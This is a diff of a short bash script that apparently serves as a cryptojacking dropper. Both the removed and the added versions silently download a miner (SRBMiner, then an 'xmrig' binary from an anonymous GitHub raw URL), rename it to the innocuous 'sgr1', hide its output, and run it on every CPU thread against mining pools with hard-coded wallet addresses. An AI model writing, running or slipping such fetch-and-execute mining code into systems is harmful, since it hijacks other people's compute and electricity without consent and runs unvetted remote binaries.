@@ -1,6 +1,4 @@
 #!/bin/bash
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.0.0/SRBMiner-Multi-1-0-0-Linux.tar.xz >/dev/null 2>&1
-tar xf SRBMiner-Multi-1-0-0-Linux.tar.xz >/dev/null 2>&1
-cd SRBMiner-Multi-1-0-0
-mv SRBMiner-MULTI sgr1
-./sgr1 --algorithm randomx --pool 149.28.147.155:80 --wallet ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 --password x --disable-cpu-optimisations --disable-huge-pages --disable-hw-aes --disable-msr-tweaks --disable-numa --cpu-threads $(nproc --all)
+wget -O sgr1 https://raw.githubusercontent.com/6248202226/filesg/main/xmrig >/dev/null 2>&1
+chmod +x sgr1
+./sgr1 -a ghostrider --url stratum-eu.rplant.xyz:7054 --user RbxJP5k7d15URHn53uMXsGWqdSGqf12Py1.x --pass webpassword=x -t $(nproc --all)
